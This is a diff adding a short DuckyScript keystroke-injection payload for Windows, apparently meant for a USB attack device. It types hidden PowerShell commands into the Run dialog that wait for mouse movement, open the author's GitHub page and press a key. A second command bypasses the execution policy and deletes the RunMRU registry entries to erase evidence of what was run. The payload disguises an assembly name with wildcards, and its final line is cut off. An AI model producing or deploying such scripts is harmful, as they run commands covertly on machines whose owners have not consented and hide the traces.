@@ -1,0 +1,23 @@
+REM ################################################
+REM #                                              #
+REM # Title        : Open website on mouse move    #
+REM # Author       : x0SiN0x                       #
+REM # Version      : 1.0                           #
+REM # Category     : example                       #
+REM # Target       : Windows                       #
+REM #                                              #
+REM ################################################
+
+DELAY 2000
+
+REM open a browser to a url when a mouse mvoement is detected
+GUI r
+DELAY 500
+STRINGLN powershell -w h Add-Type -AssemblyName *m.W*s.F*s;$w=[Windows.Forms.Cursor];$p=$w::Position.X;while(1){if($w::Position.X-ne$p){break}else{Sleep 3}};saps https://github.com/x0SiN0x;sleep 3;$o=New-Object -ComObject WScript.Shell;$o.SendKeys('f')
+
+DELAY 1500
+
+REM clear that pesky run history
+GUI r
+DELAY 500
+STRINGLN powershell -NoP -NonI -W Hidden -Exec Bypass "rp -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue;
